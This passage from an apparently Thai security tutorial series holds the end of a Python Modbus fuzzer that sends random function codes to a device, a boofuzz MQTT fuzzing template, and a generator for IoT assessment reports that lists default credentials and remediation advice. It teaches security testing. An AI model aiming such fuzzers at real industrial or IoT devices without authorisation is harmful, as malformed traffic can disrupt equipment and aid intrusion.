                payload += bytes([func_code])  # Function code
                payload += bytes([random.randint(0, 255) for _ in range(data_len)])
                
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, port))
                    s.send(payload)
                    response = s.recv(256)
                    # Check for exceptions in response
                    if len(response) >= 8 and response[7] > 0x80:
                        print(f"[*] FC{func_code}: Exception {response[8] if len(response) > 8 else '?'}")
                    s.close()
                except:
                    pass

print("=== IoT Fuzzing Tools ===")
print("  boofuzz - Network protocol fuzzer")
print("  spike - Network protocol fuzzer")
print("  AFL++ - Binary fuzzing")
print("  OpenWRT firmware fuzzing")
print("\nBoofuzz example:")
print("""
from boofuzz import *
s_initialize('mqtt_connect')
s_static(b'\x10')  # CONNECT packet type
s_size('body', length=1, math=lambda x: x)
with s_block('body'):
    s_static(b'\x00\x04MQTT\x04\x02')  # Protocol
    s_word(0, name='keepalive')
    s_bytes(b'test_client', name='client_id')
""")
```

## Step 330: IoT Security Assessment Report

```python
#!/usr/bin/env python3
# iot_assessment_report.py

from datetime import datetime
from typing import List, Dict

class IoTSecurityReport:
    def __init__(self, org: str, assessor: str, devices: List[Dict]):
        self.org = org
        self.assessor = assessor
        self.devices = devices
        self.findings = []
        self.date = datetime.now().strftime('%Y-%m-%d')
    
    def add_finding(self, device: str, issue: str, severity: str,
                    detail: str, fix: str, cvss: float = 0.0):
        self.findings.append({
            'device': device, 'issue': issue, 'severity': severity,
            'detail': detail, 'fix': fix, 'cvss': cvss
        })
    
    def generate_report(self) -> str:
        sev_count = {}
        for f in self.findings:
            sev_count[f['severity']] = sev_count.get(f['severity'], 0) + 1
        
        report = f"""# IoT Security Assessment Report

**Organization:** {self.org}  
**Date:** {self.date}  
**Assessor:** {self.assessor}  
**Devices Tested:** {len(self.devices)}  
**Total Findings:** {len(self.findings)}  

## Risk Summary

| Severity | Count |
|----------|-------|
| Critical | {sev_count.get('CRITICAL', 0)} |
| High     | {sev_count.get('HIGH', 0)} |
| Medium   | {sev_count.get('MEDIUM', 0)} |
| Low      | {sev_count.get('LOW', 0)} |

## Devices Under Assessment

| Device | IP | Firmware | Type |
|--------|-----|---------|------|
"""
        for d in self.devices:
            report += f"| {d.get('name')} | {d.get('ip')} | {d.get('firmware','Unknown')} | {d.get('type')} |\n"
        
        report += "\n## Findings\n\n"
        
        for i, f in enumerate(self.findings, 1):
            report += f"""
### Finding {i}: {f['issue']}
- **Device:** {f['device']}
- **Severity:** {f['severity']}
- **CVSS:** {f['cvss']}

**Detail:** {f['detail']}

**Remediation:** {f['fix']}

---"""
        
        report += """

## Recommendations

### Immediate Actions
1. Change all default passwords
2. Disable Telnet - use SSH only
3. Enable HTTPS/TLS for web interfaces
4. Disable UPnP where not required
5. Segment IoT devices on separate VLAN

### Short-term
1. Update firmware on all devices
2. Enable logging and monitoring
3. Implement network firewall rules
4. Disable unused services/ports

### Long-term  
1. IoT device management platform
2. Regular firmware update process
3. Network behavioral monitoring
4. Annual IoT security assessments
"""
        return report

# Demo
devices = [
    {'name': 'Hikvision DVR', 'ip': '192.168.1.100', 'firmware': '3.4.2', 'type': 'IP Camera DVR'},
    {'name': 'TP-Link Router', 'ip': '192.168.1.1', 'firmware': '1.0.13', 'type': 'Router'},
    {'name': 'MQTT Broker', 'ip': '192.168.1.50', 'firmware': 'Mosquitto 1.6', 'type': 'IoT Broker'},
]

rep = IoTSecurityReport('Smart Factory Co.', 'IoT Security Team', devices)
rep.add_finding(
    'Hikvision DVR', 'Default Admin Credentials', 'CRITICAL',
    'Device uses factory default admin:12345 credentials',
    'Change password immediately to complex value',
    9.8
)
rep.add_finding(
    'MQTT Broker', 'No Authentication Required', 'CRITICAL',
    'MQTT broker allows anonymous connections, all topics readable',
    'Enable authentication and TLS encryption',
    9.1
)
rep.add_finding(
    'TP-Link Router', 'Outdated Firmware', 'HIGH',
    'Router runs firmware 1.0.13 with known CVEs',
    'Update to latest firmware version',
    7.5
)

print(rep.generate_report())
```

---
*Part 33 เสร็จสมบูรณ์ - Steps 321-330 ครอบคลุม IoT Security Fundamentals, Device Discovery, Firmware Analysis, MQTT Security, Router/Switch Testing, IP Camera Testing, ICS/SCADA Basics, Smart Home Testing, IoT Fuzzing และ IoT Assessment Report*
